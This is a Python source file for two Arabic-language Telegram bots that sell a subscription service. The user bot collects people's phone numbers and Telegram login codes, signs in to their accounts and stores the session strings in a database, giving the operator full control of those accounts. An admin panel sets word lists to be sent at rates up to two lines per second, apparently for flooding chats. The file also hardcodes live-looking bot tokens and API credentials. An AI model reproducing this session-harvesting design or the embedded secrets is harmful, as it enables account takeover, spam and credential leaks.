import os
import sqlite3
import threading
import time
import random
import asyncio
from flask import Flask
import telebot
from telebot import types
from telethon import TelegramClient, events

# === التوكنات والمعرفات الجديدة المحدثة ===
USER_BOT_TOKEN = "8484163851:AAFOu3xCFkDCja8Xd1xlE8Lhehqt4waGhzc"
ADMIN_BOT_TOKEN = "8687012043:AAGNTvW_dYiSYW3CQcyIybo6puHnLrtY-c8"
ADMIN_ID = 5885382011

API_ID = 2040
API_HASH = "b18445a3964f16d4fe7b169106c4be12"

admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN)
user_bot = telebot.TeleBot(USER_BOT_TOKEN)

login_sessions = {}

# === إنشاء وإعداد قاعدة البيانات SQLite ===
def init_db():
    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            phone TEXT DEFAULT 'غير محدد',
            status TEXT DEFAULT 'none',
            request_time REAL DEFAULT 0,
            expiry_time REAL DEFAULT 0,
            last_active REAL DEFAULT 0,
            gender TEXT DEFAULT 'ذكر',
            custom_name TEXT DEFAULT '',
            start_kw TEXT DEFAULT '',
            stop_kw TEXT DEFAULT '',
            sing_start_kw TEXT DEFAULT '',
            sing_stop_kw TEXT DEFAULT '',
            sing_speed TEXT DEFAULT 'متوسط',
            session_str TEXT DEFAULT ''
        )
    """)
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS words (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            gender TEXT,
            word TEXT
        )
    """)
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS singulars (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            word TEXT
        )
    """)
    
    conn.commit()
    conn.close()

init_db()

def get_setting(key, default=""):
    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM settings WHERE key = ?", (key,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else default

def set_setting(key, value):
    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

if not get_setting("bot_active"): set_setting("bot_active", "1")
if not get_setting("speed"): set_setting("speed", "متوسط")


# ==============================================================================
#                               بوت المستخدم (User Bot)
# ==============================================================================

def get_user_data(user_id):
    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT status, request_time, expiry_time, gender, custom_name, start_kw, stop_kw, sing_start_kw, sing_stop_kw, sing_speed, session_str, phone FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row

@user_bot.message_handler(commands=['start'])
def user_start(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    row = get_user_data(user_id)
    current_time = time.time()
    
    if row:
        status, req_time, exp_time, gender, custom_name, start_kw, stop_kw, s_start, s_stop, s_speed, session_str, phone = row
        
        if status == 'active':
            if exp_time > 0 and current_time > exp_time:
                conn = sqlite3.connect("bot_database.db", check_same_thread=False)
                cursor = conn.cursor()
                cursor.execute("UPDATE users SET status = 'expired' WHERE user_id = ?", (user_id,))
                conn.commit()
                conn.close()
                user_bot.reply_to(message, "⚠️ انتهت فترة اشتراكك في البوت. يرجى التواصل مع المالك للتجديد.")
                return
            
            if not session_str:
                ask_phone_number(message.chat.id, user_id)
                return
                
            show_user_panel(message.chat.id, user_id)
            return
            
        elif status == 'pending':
            user_bot.reply_to(message, "⏳ تم إرسال طلبك للمالك مسبقاً، يرجى الانتظار لحين الموافقة.")
            return
            
        elif status == 'rejected':
            elapsed = current_time - req_time
            if elapsed < 300:
                remaining = int(300 - elapsed)
                mins = remaining // 60
                secs = remaining % 60
                user_bot.reply_to(message, f"❌ تم رفض طلبك سابقاً. يجب الانتظار لمدة 5 دقائق كاملة لإعادة إرسال الطلب.\nالمتبقي: {mins} دقيقة و {secs} ثانية.")
                return

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("تفعيل ✅", callback_data=f"request_act_{user_id}"))
    
    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT OR REPLACE INTO users (user_id, username, status, request_time) 
        VALUES (?, ?, 'pending', ?)
    """, (user_id, username, current_time))
    conn.commit()
    conn.close()
    
    user_bot.reply_to(message, "مرحباً بك! اضغط على زر (تفعيل ✅) لإرسال طلب الاشتراك إلى المالك:", reply_markup=markup)

def ask_phone_number(chat_id, user_id):
    msg = user_bot.send_message(chat_id, "📱 **تم قبول طلبك!**\nالآن يرجى إرسال رقم هاتفك مع مفتاح الدولة (مثال: +966500000000) لربط الحساب:")
    user_bot.register_next_step_handler(msg, process_phone_step, user_id)

def process_phone_step(message, user_id):
    phone = message.text.strip()
    user_bot.send_message(message.chat.id, "⏳ جاري إرسال كود التحقق إلى حسابك في تليجرام...")
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(send_telegram_code(message.chat.id, user_id, phone))

async def send_telegram_code(chat_id, user_id, phone):
    session_name = f"sessions/user_{user_id}"
    os.makedirs("sessions", exist_ok=True)
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    
    try:
        res = await client.send_code_request(phone)
        login_sessions[user_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": res.phone_code_hash
        }
        
        conn = sqlite3.connect("bot_database.db", check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET phone = ? WHERE user_id = ?", (phone, user_id))
        conn.commit()
        conn.close()
        
        msg = user_bot.send_message(chat_id, "📩 **تم إرسال كود التحقق!**\nيرجى إرسال الكود الذي وصلك من تليجرام الآن:")
        user_bot.register_next_step_handler(msg, process_code_step, user_id)
    except Exception as e:
        user_bot.send_message(chat_id, f"❌ حدث خطأ أثناء إرسال الكود: {e}\nأرسل /start للمحاولة مرة أخرى.")

def process_code_step(message, user_id):
    code = message.text.strip()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(verify_telegram_code(message.chat.id, user_id, code))

async def verify_telegram_code(chat_id, user_id, code):
    session_data = login_sessions.get(user_id)
    if not session_data:
        user_bot.send_message(chat_id, "❌ انتهت الجلسة. أرسل /start للمحاولة مجدداً.")
        return
        
    client = session_data["client"]
    phone = session_data["phone"]
    phone_code_hash = session_data["phone_code_hash"]
    
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        session_str = client.session.save()
        
        conn = sqlite3.connect("bot_database.db", check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET session_str = ? WHERE user_id = ?", (session_str, user_id))
        conn.commit()
        conn.close()
        
        user_bot.send_message(chat_id, "🎉 **تم تسجيل الدخول وربط الحساب بنجاح!**\nالبوت متصل بحسابك وجاهز للعمل.")
        show_user_panel(chat_id, user_id)
    except Exception as e:
        user_bot.send_message(chat_id, f"❌ خطأ في الكود أو يتطلب رمز التحقق بخطوتين: {e}")

def show_user_panel(chat_id, user_id):
    row = get_user_data(user_id)
    if not row: return
    status, req_time, exp_time, gender, custom_name, start_kw, stop_kw, s_start, s_stop, s_speed, session_str, phone = row
    
    btn_name_text = "ازالة اسم الشخص ❌" if custom_name else "الاسم ✏️"
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("كلمة التشغيل ▶️", callback_data="u_set_start_kw"),
        types.InlineKeyboardButton("كلمة الإيقاف ⏹️", callback_data="u_set_stop_kw"),
        types.InlineKeyboardButton(btn_name_text, callback_data="u_toggle_name"),
        types.InlineKeyboardButton("الجنس 👥", callback_data="u_select_gender"),
        types.InlineKeyboardButton("فرديات 📖", callback_data="u_singulars_menu")
    )
    
    info_msg = (
        f"⚙️ **لوحة التحكم الخاصة بك:**\n\n"
        f"📱 الرقم المرتبط: **{phone}**\n"
        f"🔹 الجنس المختار: **{gender}**\n"
        f"🔹 الاسم المضاف: **{custom_name if custom_name else 'لا يوجد'}**\n"
        f"🔹 كلمة التشغيل: **{start_kw if start_kw else 'غير محددة'}**\n"
        f"🔹 كلمة الإيقاف: **{stop_kw if stop_kw else 'غير محددة'}**"
    )
    user_bot.send_message(chat_id, info_msg, reply_markup=markup, parse_mode="Markdown")

@user_bot.callback_query_handler(func=lambda call: call.data.startswith("request_act_"))
def user_request_act(call):
    user_id = call.from_user.id
    username = call.from_user.username or call.from_user.first_name
    
    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("قبول 1 يوم 📅", callback_data=f"acc_1d_{user_id}"),
        types.InlineKeyboardButton("قبول أسبوع 📆", callback_data=f"acc_1w_{user_id}")
    )
    markup.row(
        types.InlineKeyboardButton("قبول شهر 🗓️", callback_data=f"acc_1m_{user_id}"),
        types.InlineKeyboardButton("قبول للابد ♾️", callback_data=f"acc_forever_{user_id}")
    )
    markup.add(types.InlineKeyboardButton("رفض ❌", callback_data=f"rej_{user_id}"))
    
    admin_bot.send_message(
        ADMIN_ID,
        f"📩 **طلب تفعيل جديد!**\n\n👤 المستخدم: @{username}\n🆔 الآي دي: `{user_id}`",
        reply_markup=markup,
        parse_mode="Markdown"
    )
    
    user_bot.answer_callback_query(call.id, "تم إرسال الطلب للمالك!")
    user_bot.edit_message_text("تم إرسال طلبك للمالك بنجاح، يرجى الانتظار لحين الموافقة ⏳", call.message.chat.id, call.message.message_id)

@user_bot.callback_query_handler(func=lambda call: call.data.startswith("u_"))
def user_panel_callbacks(call):
    user_id = call.from_user.id
    data = call.data
    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
    cursor = conn.cursor()
    
    if data == "u_select_gender":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("ذكر 🧍‍♂️", callback_data="u_set_g_ذكر"),
            types.InlineKeyboardButton("أنثى 🧍‍♀️", callback_data="u_set_g_أنثى"),
            types.InlineKeyboardButton("عودة 🔙", callback_data="u_back_home")
        )
        user_bot.edit_message_text("اختر الجنس المطلوب للكلمات والسطور:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif data.startswith("u_set_g_"):
        g = data.split("_")[3]
        cursor.execute("UPDATE users SET gender = ? WHERE user_id = ?", (g, user_id))
        conn.commit()
        user_bot.answer_callback_query(call.id, f"تم اختيار: {g}")
        show_user_panel(call.message.chat.id, user_id)
        
    elif data == "u_toggle_name":
        row = get_user_data(user_id)
        if row and row[4]: 
            cursor.execute("UPDATE users SET custom_name = '' WHERE user_id = ?", (user_id,))
            conn.commit()
            user_bot.answer_callback_query(call.id, "تم إزالة الاسم!")
            show_user_panel(call.message.chat.id, user_id)
        else:
            msg = user_bot.send_message(call.message.chat.id, "أرسل الاسم الذي تريد إضافته مع السطور:")
            user_bot.register_next_step_handler(msg, u_save_name)
            
    elif data == "u_set_start_kw":
        msg = user_bot.send_message(call.message.chat.id, "أرسل كلمة التشغيل المفتاحية:")
        user_bot.register_next_step_handler(msg, lambda m: u_save_kw(m, "start_kw"))
        
    elif data == "u_set_stop_kw":
        msg = user_bot.send_message(call.message.chat.id, "أرسل كلمة الإيقاف المفتاحية:")
        user_bot.register_next_step_handler(msg, lambda m: u_save_kw(m, "stop_kw"))
        
    elif data == "u_singulars_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("كلمة تشغيل الفرديات ▶️", callback_data="u_sing_start"),
            types.InlineKeyboardButton("كلمة إيقاف الفرديات ⏹️", callback_data="u_sing_stop"),
            types.InlineKeyboardButton("سرعة الفرديات ⚡️", callback_data="u_sing_speed"),
            types.InlineKeyboardButton("عودة 🔙", callback_data="u_back_home")
        )
        user_bot.edit_message_text("⚙️ **إعدادات الفرديات الخاصة بك:**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
        
    elif data == "u_sing_start":
        msg = user_bot.send_message(call.message.chat.id, "أرسل كلمة التشغيل المفتاحية الخاصة بالفرديات:")
        user_bot.register_next_step_handler(msg, lambda m: u_save_kw(m, "sing_start_kw"))
        
    elif data == "u_sing_stop":
        msg = user_bot.send_message(call.message.chat.id, "أرسل كلمة الإيقاف المفتاحية الخاصة بالفرديات:")
        user_bot.register_next_step_handler(msg, lambda m: u_save_kw(m, "sing_stop_kw"))
        
    elif data == "u_sing_speed":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("بطيء 🐢 (10 ثواني)", callback_data="u_s_sp_slow"),
            types.InlineKeyboardButton("متوسط 🏃 (5 ثواني)", callback_data="u_s_sp_med"),
            types.InlineKeyboardButton("سريع 💨 (3 ثواني)", callback_data="u_s_sp_fast"),
            types.InlineKeyboardButton("شخص خارجي 💻 (ثانية)", callback_data="u_s_sp_ext"),
            types.InlineKeyboardButton("سرعة قصوى ⚡️ (سطرين/ثانية)", callback_data="u_s_sp_max")
        )
        user_bot.edit_message_text("اختر السرعة الخاصة بالفرديات:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif data.startswith("u_s_sp_"):
        sp_map = {"u_s_sp_slow": "بطيء", "u_s_sp_med": "متوسط", "u_s_sp_fast": "سريع", "u_s_sp_ext": "شخص خارجي", "u_s_sp_max": "سرعة قصوى"}
        cursor.execute("UPDATE users SET sing_speed = ? WHERE user_id = ?", (sp_map[data], user_id))
        conn.commit()
        user_bot.answer_callback_query(call.id, f"تم ضبط سرعة الفرديات إلى: {sp_map[data]}")
        show_user_panel(call.message.chat.id, user_id)
        
    elif data == "u_back_home":
        show_user_panel(call.message.chat.id, user_id)
        
    conn.close()

def u_save_name(message):
    user_id = message.from_user.id
    name = message.text.strip()
    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET custom_name = ? WHERE user_id = ?", (name, user_id))
    conn.commit()
    conn.close()
    user_bot.reply_to(message, f"تم حفظ اسمك المخصص: ({name}) بنجاح! ✅")
    show_user_panel(message.chat.id, user_id)

def u_save_kw(message, col_name):
    user_id = message.from_user.id
    kw = message.text.strip()
    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute(f"UPDATE users SET {col_name} = ? WHERE user_id = ?", (kw, user_id))
    conn.commit()
    conn.close()
    user_bot.reply_to(message, f"تم حفظ الكلمة المفتاحية: ({kw}) بنجاح! ✅")
    show_user_panel(message.chat.id, user_id)


# ==============================================================================
#                               بوت التحكم (Admin Bot)
# ==============================================================================

@admin_bot.message_handler(commands=['start', 'admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    is_active = get_setting("bot_active") == "1"
    toggle_text = "إيقاف البوت 🔴" if is_active else "تشغيل البوت ✅"
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(toggle_text, callback_data="adm_toggle_bot"),
        types.InlineKeyboardButton("السرعة ⚡️", callback_data="adm_speed"),
        types.InlineKeyboardButton("السطور 📝", callback_data="adm_lines_menu"),
        types.InlineKeyboardButton("الفرديات 📖", callback_data="adm_sing_menu"),
        types.InlineKeyboardButton("المشتركين 👥", callback_data="adm_subscribers"),
        types.InlineKeyboardButton("كلمة عامة 📢", callback_data="adm_broadcast")
    )
    
    admin_bot.send_message(message.chat.id, "🛠️ **لوحة تحكم المشرف والمالك الأساسية:**", reply_markup=markup, parse_mode="Markdown")

@admin_bot.callback_query_handler(func=lambda call: True)
def admin_callbacks(call):
    if call.from_user.id != ADMIN_ID:
        return
    
    data = call.data
    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
    cursor = conn.cursor()
    
    if data.startswith("acc_") or data.startswith("rej_"):
        parts = data.split("_")
        action = parts[0]
        dur = parts[1] if len(parts) == 3 else ""
        user_id = int(parts[-1])
        
        current_time = time.time()
        
        if action == "rej":
            cursor.execute("UPDATE users SET status = 'rejected', request_time = ? WHERE user_id = ?", (current_time, user_id))
            conn.commit()
            user_bot.send_message(user_id, "❌ تم رفض طلبك من قبل المالك. يمكنك إعادة إرسال الطلب بعد مرور 5 دقائق كاملة.")
            admin_bot.edit_message_text("تم رفض الطلب بنجاح ❌", call.message.chat.id, call.message.message_id)
        else:
            exp_time = 0
            dur_text = ""
            if dur == "1d":
                exp_time = current_time + 86400
                dur_text = "يوم واحد"
            elif dur == "1w":
                exp_time = current_time + (86400 * 7)
                dur_text = "أسبوع"
            elif dur == "1m":
                exp_time = current_time + (86400 * 30)
                dur_text = "شهر"
            elif dur == "forever":
                exp_time = 0
                dur_text = "للأبد حتى الطرد"
                
            cursor.execute("UPDATE users SET status = 'active', expiry_time = ? WHERE user_id = ?", (exp_time, user_id))
            conn.commit()
            
            ask_phone_number(user_id, user_id)
            admin_bot.edit_message_text(f"تم قبول المستخدم بنجاح لمدة: ({dur_text}) ✅", call.message.chat.id, call.message.message_id)
            
    elif data == "adm_toggle_bot":
        curr = get_setting("bot_active")
        new_v = "0" if curr == "1" else "1"
        set_setting("bot_active", new_v)
        admin_bot.answer_callback_query(call.id, "تم تغيير حالة البوت العامة")
        admin_panel(call.message)
        
    elif data == "adm_speed":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("بطيء 🐢 (كل 10 ثواني)", callback_data="adm_sp_slow"),
            types.InlineKeyboardButton("متوسط 🏃 (كل 5 ثواني)", callback_data="adm_sp_med"),
            types.InlineKeyboardButton("سريع 💨 (كل 3 ثواني)", callback_data="adm_sp_fast"),
            types.InlineKeyboardButton("شخص خارجي 💻 (كل ثانية)", callback_data="adm_sp_ext"),
            types.InlineKeyboardButton("سرعة قصوى ⚡️ (سطرين بالثانية)", callback_data="adm_sp_max"),
            types.InlineKeyboardButton("عودة 🔙", callback_data="adm_back")
        )
        admin_bot.edit_message_text("اختر السرعة المطلوبة العامة للسطور:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif data.startswith("adm_sp_"):
        sp_map = {"adm_sp_slow": "بطيء", "adm_sp_med": "متوسط", "adm_sp_fast": "سريع", "adm_sp_ext": "شخص خارجي", "adm_sp_max": "سرعة قصوى"}
        set_setting("speed", sp_map[data])
        admin_bot.answer_callback_query(call.id, f"تم ضبط السرعة إلى: {sp_map[data]}")
        admin_panel(call.message)
        
    elif data == "adm_lines_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("ذكر 🧍‍♂️", callback_data="adm_words_ذكر"),
            types.InlineKeyboardButton("أنثى 🧍‍♀️", callback_data="adm_words_أنثى"),
            types.InlineKeyboardButton("عودة 🔙", callback_data="adm_back")
        )
        admin_bot.edit_message_text("اختر الجنس للسطور لإدخال الكلمات الخاصة به:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif data.startswith("adm_words_"):
        gender = data.split("_")[2]
        msg = admin_bot.send_message(call.message.chat.id, f"أرسل الكلمات الخاصة بـ ({gender}) بنفس التنسيق (مثال: هاي,السلام, عليكم):")
        admin_bot.register_next_step_handler(msg, adm_save_words, gender)
        
    elif data == "adm_sing_menu":
        msg = admin_bot.send_message(call.message.chat.id, "أرسل الفرديات الجديدة المراد حفظها بأسلوب الكلمات:")
        admin_bot.register_next_step_handler(msg, adm_save_sing)
        
    elif data == "adm_subscribers":
        cursor.execute("SELECT user_id, username, phone, last_active, status FROM users")
        users = cursor.fetchall()
        if not users:
            admin_bot.answer_callback_query(call.id, "لا يوجد مشتركين حالياً.")
            conn.close()
            return
            
        text = "👥 **بيانات المشتركين:**\n\n"
        markup = types.InlineKeyboardMarkup()
        for u in users:
            uid, uname, phone, last_act, ustat = u
            act_str = f"قبل {int((time.time() - last_act)/60)} دقيقة" if last_act > 0 else "لم يستخدم البوت بعد"
            text += f"المستخدم: @{uname}\nرقمه: {phone}\nحالة النشاط: ({act_str})\nالحالة: {ustat}\n------------------\n"
            markup.add(types.InlineKeyboardButton(f"طرد @{uname} 🚫", callback_data=f"adm_kick_{uid}"))
            
        markup.add(types.InlineKeyboardButton("عودة 🔙", callback_data="adm_back"))
        admin_bot.send_message(call.message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
        
    elif data.startswith("adm_kick_"):
        target_id = int(data.split("_")[2])
        cursor.execute("UPDATE users SET status = 'kicked' WHERE user_id = ?", (target_id,))
        conn.commit()
        admin_bot.answer_callback_query(call.id, "تم طرد المشترك فوراً 🚫")
        user_bot.send_message(target_id, "تم طردك وإيقاف حسابك من البوت بواسطة المالك.")
        admin_panel(call.message)
        
    elif data == "adm_broadcast":
        msg = admin_bot.send_message(call.message.chat.id, "أرسل الكلمة العامة ليتم إرسالها للجميع فورا:")
        admin_bot.register_next_step_handler(msg, adm_broadcast_send)
        
    elif data == "adm_back":
        admin_panel(call.message)
        
    conn.close()

def adm_save_words(message, gender):
    if message.from_user.id != ADMIN_ID: return
    words = [w.strip() for w in message.text.split(",") if w.strip()]
    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM words WHERE gender = ?", (gender,))
    for w in words:
        cursor.execute("INSERT INTO words (gender, word) VALUES (?, ?)", (gender, w))
    conn.commit()
    conn.close()
    admin_bot.reply_to(message, f"تم حفظ الكلمات الخاصة بـ ({gender}) بنجاح ✅")

def adm_save_sing(message):
    if message.from_user.id != ADMIN_ID: return
    words = [w.strip() for w in message.text.split(",") if w.strip()]
    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM singulars")
    for w in words:
        cursor.execute("INSERT INTO singulars (word) VALUES (?)", (w,))
    conn.commit()
    conn.close()
    admin_bot.reply_to(message, "تم حفظ الفرديات بنجاح ✅")

def adm_broadcast_send(message):
    if message.from_user.id != ADMIN_ID: return
    text = message.text
    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users WHERE status = 'active'")
    users = cursor.fetchall()
    conn.close()
    
    count = 0
    for u in users:
        try:
            user_bot.send_message(u[0], text)
            count += 1
        except: pass
    admin_bot.reply_to(message, f"تم إرسال الكلمة العامة لـ {count} مشترك بنجاح 📢")


# ==============================================================================
#                 خادم Flask للحفاظ على عمل البوت 24/7 دون نوم
# ==============================================================================

app = Flask('')

@app.route('/')
def home():
    return "Bot is active & running 24/7!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)


# ==============================================================================
#                              التشغيل المتزامن
# ==============================================================================

def run_admin():
    while True:
        try:
            admin_bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception:
            time.sleep(5)

def run_user():
    while True:
        try:
            user_bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    t_flask = threading.Thread(target=run_flask)
    t_flask.daemon = True
    t_flask.start()
    
    t_admin = threading.Thread(target=run_admin)
    t_admin.daemon = True
    t_admin.start()
    
    run_user()
